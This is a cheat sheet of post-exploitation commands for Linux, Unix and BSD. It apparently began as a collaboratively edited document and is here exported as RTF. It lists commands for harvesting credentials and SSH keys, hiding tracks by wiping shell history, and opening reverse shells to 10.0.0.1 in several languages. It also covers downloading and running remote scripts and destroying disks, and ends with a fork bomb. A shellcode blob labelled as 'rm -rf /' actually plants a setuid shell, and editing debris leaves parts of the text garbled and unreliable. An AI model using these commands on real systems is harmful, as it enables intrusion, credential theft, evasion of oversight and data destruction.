{\rtf1\ansi\ansicpg1252\uc1\deff0
{\fonttbl{\f0\fmodern\fcharset0\fprq2 Courier New;}}
{\colortbl;\red0\green0\blue0;\red255\green255\blue255;}
\paperw12240\paperh15840\margl1800\margr1800\margt1440\margb1440\fet2\ftnbj\aenddoc
\pgnrestart\pgnstarts0
\pard\plain \fi720\ltrch\loch {\f0\fs24\b0\i0 Linux/Unix/BSD Post-Exploitation}
\par\plain {\f0\fs24\b0\i0 Command List}
\par\plain {\f0\fs24\b0\i0 If for any reason you cannot access/edit these files in the future, please contact}
\par\plain {\f0\fs24\b0\i0 mubix@hak5.org}
\par\plain {\f0\fs24\b0\i0 You can download these files in any format using Google   Doc\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92s}
\par\plain {\f0\fs24\b0\i0 File->Download As method}
\par\plain {\f0\fs24\b0\i0 If you are viewing this on anything other than Google Docs, you can get}
\par\plain {\f0\fs24\b0\i0 access to the latest links to the Linux/Unix/BSD, OS X, Obscure, Metasploit, and}
\par\plain {\f0\fs24\b0\i0 Windows docs here: http://bit.ly/nuc0N0}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 DISCLAIMER: Anyone can edit these docs, and all that entails and implies}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 \'0C}
\par\plain {\f0\fs24\b0\i0 Table of Contents}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u61439\'3FTable of Contents}
\par\plain {\f0\fs24\b0\i0 Information}
\par\plain {\f0\fs24\b0\i0 Blind Files}
\par\plain {\f0\fs24\b0\i0 System}
\par\plain {\f0\fs24\b0\i0 Networking}
\par\plain {\f0\fs24\b0\i0 User accounts}
\par\plain {\f0\fs24\b0\i0 Credentials}
\par\plain {\f0\fs24\b0\i0 Configs}
\par\plain {\f0\fs24\b0\i0 Determine Distro}
\par\plain {\f0\fs24\b0\i0 Installed Packages}
\par\plain {\f0\fs24\b0\i0 Package Sources}
\par\plain {\f0\fs24\b0\i0 Finding Important Files}
\par\plain {\f0\fs24\b0\i0 Covering Your Tracks}
\par\plain {\f0\fs24\b0\i0 Avoiding history filesmys}
\par\plain {\f0\fs24\b0\i0 Obtain users\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92 information}
\par\plain {\f0\fs24\b0\i0 Escalating}
\par\plain {\f0\fs24\b0\i0 Looking for possible opened paths}
\par\plain {\f0\fs24\b0\i0 Maintaining control}
\par\plain {\f0\fs24\b0\i0 Reverse Shell}
\par\plain {\f0\fs24\b0\i0 Fun if Windows is present and accessible}
\par\plain {\f0\fs24\b0\i0 Stuff to be sorted}
\par\plain {\f0\fs24\b0\i0 sudo -p}
\par\plain {\f0\fs24\b0\i0 allows the user to define what the password prompt will be}
\par\plain {\f0\fs24\b0\i0 Deleting and Destroying}
\par\plain {\f0\fs24\b0\i0 Execute a remote script}
\par\plain {\f0\fs24\b0\i0 Fork Bomb\loch\af0\hich\af0\dbch\af0\uc1\u61438\'3F}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 \'0C}
\par\plain {\f0\fs24\b0\i0 Information}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Blind Files}
\par\plain {\f0\fs24\b0\i0 (things to pull when all you can do is blindly read) LFI/dir traversal (Don\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92t forget %00!)}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 File}
\par\plain {\f0\fs24\b0\i0 Contents and Reason}
\par\plain {\f0\fs24\b0\i0 /etc/resolv.conf}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0  }
\par\plain {\f0\fs24\b0\i0 Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd}
\par\plain {\f0\fs24\b0\i0 /etc/motd}
\par\plain {\f0\fs24\b0\i0 Message of the Day. }
\par\plain {\f0\fs24\b0\i0 /etc/issue}
\par\plain {\f0\fs24\b0\i0 Debian - current version of distro}
\par\plain {\f0\fs24\b0\i0 /etc/passwd}
\par\plain {\f0\fs24\b0\i0 List of local users }
\par\plain {\f0\fs24\b0\i0 /etc/shadow}
\par\plain {\f0\fs24\b0\i0 List of users\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92 passwords\u8217\'92 hashes (requires root)}
\par\plain {\f0\fs24\b0\i0 /home/xxx/.bash_history}
\par\plain {\f0\fs24\b0\i0 Will give you some directory context}
\par\plain {\f0\fs24\b0\i0 System}
\par\plain {\f0\fs24\b0\i0 Command    }
\par\plain {\f0\fs24\b0\i0 Description and/or Reason}
\par\plain {\f0\fs24\b0\i0 uname -a    }
\par\plain {\f0\fs24\b0\i0 Prints the kernel version, arch, sometimes distro, ...    }
\par\plain {\f0\fs24\b0\i0 ps aux}
\par\plain {\f0\fs24\b0\i0 List all running processes}
\par\plain {\f0\fs24\b0\i0 top -n 1 -d}
\par\plain {\f0\fs24\b0\i0 Print process, 1 is a number of lines}
\par\plain {\f0\fs24\b0\i0 id}
\par\plain {\f0\fs24\b0\i0 Your current username, groups}
\par\plain {\f0\fs24\b0\i0 arch, uname -m}
\par\plain {\f0\fs24\b0\i0 Kernel processor architecture        }
\par\plain {\f0\fs24\b0\i0 w}
\par\plain {\f0\fs24\b0\i0 who is connected, uptime and load avg}
\par\plain {\f0\fs24\b0\i0 who -a}
\par\plain {\f0\fs24\b0\i0 uptime, runlevel, tty, proceses etc.        }
\par\plain {\f0\fs24\b0\i0 gcc -v}
\par\plain {\f0\fs24\b0\i0 Returns the version of GCC.}
\par\plain {\f0\fs24\b0\i0 mysql --version}
\par\plain {\f0\fs24\b0\i0 Returns the version of MySQL.}
\par\plain {\f0\fs24\b0\i0 perl -v}
\par\plain {\f0\fs24\b0\i0 Returns the version of Perl.}
\par\plain {\f0\fs24\b0\i0 ruby -v}
\par\plain {\f0\fs24\b0\i0 Returns the version of Ruby.}
\par\plain {\f0\fs24\b0\i0 python --version        }
\par\plain {\f0\fs24\b0\i0 Returns the version of Python.}
\par\plain {\f0\fs24\b0\i0 df -k}
\par\plain {\f0\fs24\b0\i0 mounted fs, size, % use, dev and mount point[}
\par\plain {\f0\fs24\b0\i0 mount}
\par\plain {\f0\fs24\b0\i0 mounted fs        }
\par\plain {\f0\fs24\b0\i0 last -a}
\par\plain {\f0\fs24\b0\i0 Last users logged on}
\par\plain {\f0\fs24\b0\i0 lastcomm}
\par\plain {\f0\fs24\b0\i0         }
\par\plain {\f0\fs24\b0\i0 lastlog    }
\par\plain {\f0\fs24\b0\i0         }
\par\plain {\f0\fs24\b0\i0 lastlogin (BSD)}
\par\plain {\f0\fs24\b0\i0         }
\par\plain {\f0\fs24\b0\i0 getenforce}
\par\plain {\f0\fs24\b0\i0 Get the status of SELinux (Enforcing, Permissive or Disabled)}
\par\plain {\f0\fs24\b0\i0 dmesg    }
\par\plain {\f0\fs24\b0\i0 Informations from the last system boot}
\par\plain {\f0\fs24\b0\i0 lspci}
\par\plain {\f0\fs24\b0\i0 prints all PCI buses and devices}
\par\plain {\f0\fs24\b0\i0 lsusb}
\par\plain {\f0\fs24\b0\i0 prints all USB buses and devices/h}
\par\plain {\f0\fs24\b0\i0 lscpu}
\par\plain {\f0\fs24\b0\i0 prints CPU information}
\par\plain {\f0\fs24\b0\i0 lshw}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 ex}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 cat /proc/cpuinfo}
\par\plain {\f0\fs24\b0\i0         }
\par\plain {\f0\fs24\b0\i0 cat /proc/meminfo}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 du -h --max-depth=1 /}
\par\plain {\f0\fs24\b0\i0 (note: can cause heavy disk i/o)}
\par\plain {\f0\fs24\b0\i0 which nmap}
\par\plain {\f0\fs24\b0\i0 locate a command (ie nmap or nc)}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 locate bin/nmap}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 locate bin/nc}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 jps -l}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 java -version}
\par\plain {\f0\fs24\b0\i0 Returns the version of Java.}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Networking}
\par\plain {\f0\fs24\b0\i0 hostname -f}
\par\plain {\f0\fs24\b0\i0 ip addr show}
\par\plain {\f0\fs24\b0\i0 ip ro show}
\par\plain {\f0\fs24\b0\i0 ifconfig -a}
\par\plain {\f0\fs24\b0\i0 route -n}
\par\plain {\f0\fs24\b0\i0 cat /etc/network/interfaces}
\par\plain {\f0\fs24\b0\i0 iptables -L -n -v}
\par\plain {\f0\fs24\b0\i0 iptables -t nat -L -n -v}
\par\plain {\f0\fs24\b0\i0 ip6tables -L -n -v}
\par\plain {\f0\fs24\b0\i0 iptables-save}
\par\plain {\f0\fs24\b0\i0 netstat -anop}
\par\plain {\f0\fs24\b0\i0 netstat -r}
\par\plain {\f0\fs24\b0\i0 netstat -nltupw (root with raw sockets)}
\par\plain {\f0\fs24\b0\i0 arp -a}
\par\plain {\f0\fs24\b0\i0 lsof -nPi}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 The information returned by these commands can also be acquired through \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93cat /proc/net/*\u8221\'94. This is less likely to trigger monitoring alerts. The drawback is that it generates a lot of information which then has to be analyzed.}
\par\plain {\f0\fs24\b0\i0 User accounts}
\par\plain {\f0\fs24\b0\i0      local accounts: cat /etc/passwd}
\par\plain {\f0\fs24\b0\i0 password hashes in /etc/shadow on Linux}
\par\plain {\f0\fs24\b0\i0 password hashes in /etc/security/passwd on AIX}
\par\plain {\f0\fs24\b0\i0 groups in /etc/group (and/or /etc/gshadow on Linux)}
\par\plain {\f0\fs24\b0\i0 all accounts: getent passwd}
\par\plain {\f0\fs24\b0\i0 should dump local, LDAP, NIS, whatever the system is using}
\par\plain {\f0\fs24\b0\i0 same with getent group}
\par\plain {\f0\fs24\b0\i0 Samba\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92s own database: pdbedit -L -w or pdbedit -L -v}
\par\plain {\f0\fs24\b0\i0 privileged accounts: cat     }
\par\plain {\f0\fs24\b0\i0 (above: cat ???)}
\par\plain {\f0\fs24\b0\i0 mail aliases: cat /etc/aliases find /etc -name aliases, getent aliases }
\par\plain {\f0\fs24\b0\i0 NIS accounts: ypcat passwd - displays NIS password file}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Credentials}
\par\plain {\f0\fs24\b0\i0 SSH keys, often passwordless: /home/*/.ssh/id*}
\par\plain {\f0\fs24\b0\i0 SSH agent:}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Kerberos tickets: /tmp/krb5cc_*, /tmp/krb5.keytab}
\par\plain {\f0\fs24\b0\i0 PGP keys: /home/*/.gnupg/secring.gpgs}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Configs}
\par\plain {\f0\fs24\b0\i0 ls -aRl /etc/ | awk '$1 ~ /w.$/' | grep -v lrwx 2>/dev/nullte    }
\par\plain {\f0\fs24\b0\i0 cat /etc/issue\{,.net\}}
\par\plain {\f0\fs24\b0\i0 cat /etc/master.passwd}
\par\plain {\f0\fs24\b0\i0 cat /etc/group}
\par\plain {\f0\fs24\b0\i0 cat /etc/hosts}
\par\plain {\f0\fs24\b0\i0 cat /etc/crontab}
\par\plain {\f0\fs24\b0\i0 cat /etc/sysctl.conf}
\par\plain {\f0\fs24\b0\i0 for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)}
\par\plain {\f0\fs24\b0\i0 cat /etc/resolv.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/syslog.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/chttp.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/lighttpd.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/cups/cupsd.confcda}
\par\plain {\f0\fs24\b0\i0 cat /etc/inetd.conf    }
\par\plain {\f0\fs24\b0\i0 cat /opt/lampp/etc/httpd.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/samba/smb.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/openldap/ldap.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/ldap/ldap.conf}
\par\plain {\f0\fs24\b0\i0 cat /etc/exports}
\par\plain {\f0\fs24\b0\i0 cat /etc/auto.master}
\par\plain {\f0\fs24\b0\i0 cat /etc/auto_master}
\par\plain {\f0\fs24\b0\i0 cat /etc/fstab}
\par\plain {\f0\fs24\b0\i0 find /etc/sysconfig/ -type f -exec cat \{\} \\;}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Determine Distro}
\par\plain {\f0\fs24\b0\i0 lsb_release -d                        # Generic command for all LSB distros}
\par\plain {\f0\fs24\b0\i0 /etc/os-release                    # Generic for distros using \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93systemd\u8221\'94}
\par\plain {\f0\fs24\b0\i0 /etc/issue                        # Generic but often modified}
\par\plain {\f0\fs24\b0\i0 cat /etc/*release}
\par\plain {\f0\fs24\b0\i0 /etc/SUSE-release                     # Novell SUSE         }
\par\plain {\f0\fs24\b0\i0 /etc/redhat-release, /etc/redhat_version         # Red Hat}
\par\plain {\f0\fs24\b0\i0 /etc/fedora-release                     # Fedora}
\par\plain {\f0\fs24\b0\i0 /etc/slackware-release, /etc/slackware-version     # Slackware}
\par\plain {\f0\fs24\b0\i0 /etc/debian_release, /etc/debian_version        # Debian}
\par\plain {\f0\fs24\b0\i0 /etc/mandrake-release                 # Mandrake}
\par\plain {\f0\fs24\b0\i0 /etc/sun-release                     # Sun JDS}
\par\plain {\f0\fs24\b0\i0 /etc/release                        # Solaris/Sparc}
\par\plain {\f0\fs24\b0\i0 /etc/gentoo-release                     # Gentoo}
\par\plain {\f0\fs24\b0\i0 /etc/arch-release                    # Arch Linux (file will be empty)}
\par\plain {\f0\fs24\b0\i0 arch                            # OpenBSD; sample: \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93OpenBSD.amd64\u8221\'94}
\par\plain {\f0\fs24\b0\i0 uname -a                        # often hints at it pretty well}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Installed Packages}
\par\plain {\f0\fs24\b0\i0 rpm -qa --last | head}
\par\plain {\f0\fs24\b0\i0 yum list | grep installed}
\par\plain {\f0\fs24\b0\i0 Debian:        dpkg -l}
\par\plain {\f0\fs24\b0\i0 dpkg -l | grep -i \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93linux-image\u8221\'94}
\par\plain {\f0\fs24\b0\i0 dpkg --get-selections}
\par\plain {\f0\fs24\b0\i0 \{Free,Net\}BSD:    pkg_info}
\par\plain {\f0\fs24\b0\i0 Solaris:        pkginfo}
\par\plain {\f0\fs24\b0\i0 Gentoo:                 # equery must be installed}
\par\plain {\f0\fs24\b0\i0 cd /var/db/pkg/ && ls -d */*    # always works}
\par\plain {\f0\fs24\b0\i0 Arch Linux:        pacman -Q}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Package Sources}
\par\plain {\f0\fs24\b0\i0 cat /etc/apt/sources.list}
\par\plain {\f0\fs24\b0\i0 ls -l /etc/yum.repos.d/}
\par\plain {\f0\fs24\b0\i0 cat /etc/yum.conf}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Finding Important Files}
\par\plain {\f0\fs24\b0\i0 ls -dlR */ #}
\par\plain {\f0\fs24\b0\i0 ls -alR | grep ^d}
\par\plain {\f0\fs24\b0\i0 find /var -type d}
\par\plain {\f0\fs24\b0\i0 ls -dl `find /var -type d`}
\par\plain {\f0\fs24\b0\i0 ls -dl `find /var -type d` | grep -v root}
\par\plain {\f0\fs24\b0\i0 find /var ! -user root -type d -ls}
\par\plain {\f0\fs24\b0\i0 find /var/log -type f -exec ls -la \{\} \\;}
\par\plain {\f0\fs24\b0\i0 find / -perm -4000 (find all suid files)}
\par\plain {\f0\fs24\b0\i0 ls -alhtr /mnt}
\par\plain {\f0\fs24\b0\i0 ls -alhtr /media}
\par\plain {\f0\fs24\b0\i0 ls -alhtr /tmp}
\par\plain {\f0\fs24\b0\i0 ls -alhtr /home}
\par\plain {\f0\fs24\b0\i0 cd /home/; treels /home/*/.ssh/*}
\par\plain {\f0\fs24\b0\i0 find /home -type f -iname '.*history'}
\par\plain {\f0\fs24\b0\i0 ls -lart /etc/rc.d/}
\par\plain {\f0\fs24\b0\i0 locate tar | grep [.]tar$  # Remember to updatedb before running locate}
\par\plain {\f0\fs24\b0\i0 locate tgz | grep [.]tgz$}
\par\plain {\f0\fs24\b0\i0 locate sql | grep [.]sql$}
\par\plain {\f0\fs24\b0\i0 locate settings | grep [.]php$  }
\par\plain {\f0\fs24\b0\i0 locate config.inc | grep [.]php$}
\par\plain {\f0\fs24\b0\i0 ls /home/*/id*}
\par\plain {\f0\fs24\b0\i0  .properties | grep [.]properties # java config files}
\par\plain {\f0\fs24\b0\i0 locate .xml | grep [.]xml # java/.net config files}
\par\plain {\f0\fs24\b0\i0 find /sbin /usr/sbin /opt /lib `echo $PATH | \loch\af0\hich\af0\dbch\af0\uc1\u8216\'91sed s/:/ /g\u8217\'92` -perm /6000  -ls # find suids}
\par\plain {\f0\fs24\b0\i0 locate rhosts}
\par\plain {\f0\fs24\b0\i0 Covering Your Tracks}
\par\plain {\f0\fs24\b0\i0 Avoiding history filesmys}
\par\plain {\f0\fs24\b0\i0 export HISTFILE=}
\par\plain {\f0\fs24\b0\i0 or }
\par\plain {\f0\fs24\b0\i0 unset HISTFILE}
\par\plain {\f0\fs24\b0\i0 This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:    }
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 However if you happen to be on an account that was originally inaccessible, if the .bash_history file is available (ls -a ~), viewcating its contents can provide you with a good deal of information about the system and its most recent updates/changes.  }
\par\plain {\f0\fs24\b0\i0 clear all history in ram}
\par\plain {\f0\fs24\b0\i0 history -c}
\par\plain {\f0\fs24\b0\i0 rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null (invasive)}
\par\plain {\f0\fs24\b0\i0 touch ~/.bash_history (invasive)}
\par\plain {\f0\fs24\b0\i0 <space> history -c (using a space before a command)    }
\par\plain {\f0\fs24\b0\i0 zsh% unset HISTFILE HISTSIZE    }
\par\plain {\f0\fs24\b0\i0 tcsh% set history=0    }
\par\plain {\f0\fs24\b0\i0 bash$ set +o history}
\par\plain {\f0\fs24\b0\i0 ksh$ unset HISTFILE}
\par\plain {\f0\fs24\b0\i0 find / -type f -exec \{\} (forensics nightmare)}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Note that you\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92re probably better off modifying or temporary disabling rather than deleting history files, it leaves a lot less traces and is less suspect.}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 In some cases HISTFILE and HISTFILESIZE are made read-only; get around this by explicitly clearing history (history -c) or by kill -9 $$\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92ing the shell. Sometimes the shell can be configured to run \u8216\'91history -w\u8217\'92 after every command; get around this by overriding \u8216\'91history\u8217\'92 with a no-op shell function. None of this will help if the shell is configured to log everything to syslog, however.}
\par\plain {\f0\fs24\b0\i0 Obtain users\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92 information}
\par\plain {\f0\fs24\b0\i0 ls -alh /home/*/    }
\par\plain {\f0\fs24\b0\i0 ls -alh /home/*/.ssh/}
\par\plain {\f0\fs24\b0\i0 cat /home/*/.ssh/authorized_keys}
\par\plain {\f0\fs24\b0\i0 cat /home/*/.ssh/known_hosts}
\par\plain {\f0\fs24\b0\i0 cat /home/*/.*hist* # you can learn a lot from this}
\par\plain {\f0\fs24\b0\i0 find /home/*/.vnc /home/*/.subversion -type f }
\par\plain {\f0\fs24\b0\i0 grep ^ssh /home/*/.*hist*}
\par\plain {\f0\fs24\b0\i0 grep ^telnet `/home/*/.*hist*}
\par\plain {\f0\fs24\b0\i0 grep ^mysql /home/*/.*hist*}
\par\plain {\f0\fs24\b0\i0 cat /home/*/.viminfo}
\par\plain {\f0\fs24\b0\i0 sudo -l # if sudoers is not. readable, this sometimes works per user}
\par\plain {\f0\fs24\b0\i0 crontab -l}
\par\plain {\f0\fs24\b0\i0 cat /home/*/.mysql_history}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Escalating}
\par\plain {\f0\fs24\b0\i0 Looking for possible opened paths}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 ls -alh /root/}
\par\plain {\f0\fs24\b0\i0 sudo -l}
\par\plain {\f0\fs24\b0\i0 cat /etc/sudoers}
\par\plain {\f0\fs24\b0\i0 cat /etc/shadow}
\par\plain {\f0\fs24\b0\i0 cat /etc/master.passwd # OpenBSD}
\par\plain {\f0\fs24\b0\i0 cat /var/spool/cron/crontabs/* | cat /var/spool/cron/*}
\par\plain {\f0\fs24\b0\i0 lsof -nPi}
\par\plain {\f0\fs24\b0\i0 ls /home/*/.ssh/*}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Maintaining control}
\par\plain {\f0\fs24\b0\i0 Reverse Shell}
\par\plain {\f0\fs24\b0\i0 Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet}
\par\plain {\f0\fs24\b0\i0 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 (No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).}
\par\plain {\f0\fs24\b0\i0 perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i))))\{ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");\};'}
\par\plain {\f0\fs24\b0\i0 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'}
\par\plain {\f0\fs24\b0\i0 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'}
\par\plain {\f0\fs24\b0\i0 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore}
\par\plain {\f0\fs24\b0\i0 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f}
\par\plain {\f0\fs24\b0\i0 xterm -display 10.0.0.1:1se    }
\par\plain {\f0\fs24\b0\i0 Listener- Xnest :1}
\par\plain {\f0\fs24\b0\i0 Add permission to connect- xhost +victimIP}
\par\plain {\f0\fs24\b0\i0 ssh -NR 3333:localhost:22 user@yourhost}
\par\plain {\f0\fs24\b0\i0 nc -e /bin/sh 10.0.0.1 1234}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Fun if Windows is present and accessible}
\par\plain {\f0\fs24\b0\i0 If there is Windows installed and the logged-in user access level includes those Windows partition, attacker can mount them up and do a much deeper information gathering, credential theft and root-ing. Ntfs-3g is useful for mounting ntfs partitions read-write.}
\par\plain {\f0\fs24\b0\i0 TODO: insert details on what to look for}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Stuff to be sorted}
\par\plain {\f0\fs24\b0\i0 ## GOING TO MOVE EVERYTHING HERE FOR LEGIBILITY ONCE EDITING DIES DOWN}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Command    }
\par\plain {\f0\fs24\b0\i0 Output}
\par\plain {\f0\fs24\b0\i0 ps aux        }
\par\plain {\f0\fs24\b0\i0 List of running processes}
\par\plain {\f0\fs24\b0\i0 id}
\par\plain {\f0\fs24\b0\i0 List current user and group along with user/group id        }
\par\plain {\f0\fs24\b0\i0 w}
\par\plain {\f0\fs24\b0\i0 Show info about who is logged, what are they are doing        }
\par\plain {\f0\fs24\b0\i0 who -a}
\par\plain {\f0\fs24\b0\i0 Print information about users        }
\par\plain {\f0\fs24\b0\i0 cat /dev/core > /dev/audio}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 cat /dev/mem > /dev/audio}
\par\plain {\f0\fs24\b0\i0 Makes a sound from the memory content.}
\par\plain {\f0\fs24\b0\i0 Usefulness of this??? (none, aside from pissing off the sysadmin, in the very unlikely case that the server has speakers and the legacy OSS driver)}
\par\plain {\f0\fs24\b0\i0 sudo -p}
\par\plain {\f0\fs24\b0\i0 allows the user to define what the password prompt will be}
\par\plain {\f0\fs24\b0\i0 (useful for fun customization with aliases or shell scripts)}
\par\plain {\f0\fs24\b0\i0 Deleting and Destroying}
\par\plain {\f0\fs24\b0\i0 (If it is necessary to leave the machine inaccessible or unusable)}
\par\plain {\f0\fs24\b0\i0 Note that this tends to be quite evident (as opposed to a simple exploitation that might go unnoticed for some time, even forever), and will most surely get you into troubles.}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 Oh, and you\loch\af0\hich\af0\dbch\af0\uc1\u8217\'92re probably a jerk if you use any of the stuff below.}
\par\plain {\f0\fs24\b0\i0 Command}
\par\plain {\f0\fs24\b0\i0 Description}
\par\plain {\f0\fs24\b0\i0 rm -rf /}
\par\plain {\f0\fs24\b0\i0 This will recursively try to delete all files.}
\par\plain {\f0\fs24\b0\i0 char esp[] __attribute__ ((section(\loch\af0\hich\af0\dbch\af0\uc1\u8221\'94.text\u8221\'94))) /* e.s.p release */ = \u8220\'93\\xeb\\x3e\\x5b\\x31\\xc0\\x50\\x54\\x5a\\x83\\xec\\x64\\x68\u8243\'3F}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93\\xff\\xff\\xff\\xff\\x68\\xdf\\xd0\\xdf\\xd9\\x68\\x8d\\x99\u8243\'3F}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93\\xdf\\x81\\x68\\x8d\\x92\\xdf\\xd2\\x54\\x5e\\xf7\\x16\\xf7\u8243\'3F}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93\\x56\\x04\\xf7\\x56\\x08\\xf7\\x56\\x0c\\x83\\xc4\\x74\\x56\u8243\'3F}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93\\x8d\\x73\\x08\\x56\\x53\\x54\\x59\\xb0\\x0b\\xcd\\x80\\x31\u8243\'3F}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93\\xc0\\x40\\xeb\\xf9\\xe8\\xbd\\xff\\xff\\xff\\x2f\\x62\\x69\u8243\'3F}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93\\x6e\\x2f\\x73\\x68\\x00\\x2d\\x63\\x00\u8243\'3F}
\par\plain {\f0\fs24\b0\i0 \loch\af0\hich\af0\dbch\af0\uc1\u8220\'93cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;\u8221\'94;    }
\par\plain {\f0\fs24\b0\i0 Hex version of rm -rf /    }
\par\plain {\f0\fs24\b0\i0 How is this supposed to work?}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 mkfs.ext3 /dev/sda}
\par\plain {\f0\fs24\b0\i0 Reformat the device mentioned, making recovery of files hard.        }
\par\plain {\f0\fs24\b0\i0 dd if=/dev/zero of=/dev/sda bs=1M}
\par\plain {\f0\fs24\b0\i0 Overwrite disk /dev/sda with zeros}
\par\plain {\f0\fs24\b0\i0 Execute a remote script}
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 wget http://server/file.sh -O- | sh}
\par\plain {\f0\fs24\b0\i0 This command forces the download of a file and immediately its execution, can be exploited easily using or reverse shit        }
\par\plain {\f0\fs24\b0\i0 Fork Bomb}
\par\plain {\f0\fs24\b0\i0 :()\{:|:&\};:}
\par\plain \f0\fs24\b0\i0
\par\plain \f0\fs24\b0\i0
\par\plain {\f0\fs24\b0\i0 The [in]famous "fork bomb". This command will cause your system to run a large number of processes, until it "hangs". This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.}
\par\plain \f0\fs24\b0\i0
